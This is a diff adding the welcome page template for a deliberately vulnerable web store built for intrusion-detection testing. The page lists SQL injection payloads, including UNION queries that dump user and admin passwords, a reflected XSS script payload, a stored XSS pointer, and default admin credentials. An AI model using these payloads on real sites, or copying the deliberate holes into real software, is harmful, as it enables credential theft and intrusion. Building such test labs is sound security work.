@@ -1,0 +1,38 @@
+{% extends "base.html" %}
+{% block title %}Welcome{% endblock %}
+
+{% block content %}
+<h2>Welcome to the Deliberately Insecure Store!</h2>
+<p>This site is designed with multiple intentional vulnerabilities for IDS testing.</p>
+<p>Explore <a href="{{ url_for('list_products') }}">our products</a>, try the <a href="{{ url_for('search_products') }}">vulnerable search</a>, or register an account.</p>
+<p style="color:red; font-weight:bold;">Admin Login: <a href="{{ url_for('admin_login') }}">/admin/login</a> (try 'admin'/'adminpass' or SQL injection)</p>
+
+<h3>Vulnerable Search Examples (SQL Injection):</h3>
+<p>These searches are processed by a backend vulnerable to SQL Injection.</p>
+<ul>
+    <li>Normal Search: <a href="{{ url_for('search_products', q='Shirt') }}"><code>?q=Shirt</code></a></li>
+    <li>Condition Bypass: <a href="{{ url_for('search_products', q="Shirt' OR '1'='1") }}"><code>?q=Shirt' OR '1'='1</code></a></li>
+    <li>UNION Attack (Users - displays usernames/passwords INSECURELY):
+        <a href="{{ url_for('search_products', q="xyz' UNION SELECT username, password, email, id::text, null, null, null FROM users -- ") }}">
+        <code>?q=xyz' UNION SELECT username, password, email, id::text, null, null, null FROM users -- </code></a>
+    </li>
+     <li>UNION Attack (Admin Users - displays admin usernames/passwords INSECURELY):
+        <a href="{{ url_for('search_products', q="xyz' UNION SELECT username, password, null, null, null, null, null FROM admin_users -- ") }}">
+        <code>?q=xyz' UNION SELECT username, password, null, null, null, null, null FROM admin_users -- </code></a>
+    </li>
+    <li>Error-Based (PostgreSQL version):
+        <a href="{{ url_for('search_products', q="xyz' AND 1=(SELECT CAST(version() AS NUMERIC)) -- ") }}">
+        <code>?q=xyz' AND 1=(SELECT CAST(version() AS NUMERIC)) -- </code> (Might cause error page showing version)</a>
+    </li>
+</ul>
+
+<h3>Reflected XSS Example:</h3>
+<p>The search term is reflected in the page title and heading. If the backend didn't sanitize (and Jinja didn't escape by default), this could be XSS. For a direct XSS via URL, the backend would need to be extremely naive or use `|safe` on the search term display.</p>
+<p>Try searching for: <code><script>alert('XSS Search')</script></code></p>
+<p><a href="{{ url_for('search_products', q='<script>alert(\'XSS Search\')</script>') }}">Reflected XSS Search Attempt</a></p>
+<p>(Note: Jinja2's default autoescaping usually prevents this reflected XSS unless `|safe` is used on the search term in the template directly).</p>
+
+<h3>Stored XSS Example:</h3>
+<p>One of the product descriptions in `init.sql` contains a script tag. View this product:</p>
+<p><a href="{{ url_for('product_detail', product_id=4) }}">View "Summer Dress" (Product ID 4)</a> (Description has XSS)</p>
+{% endblock %}
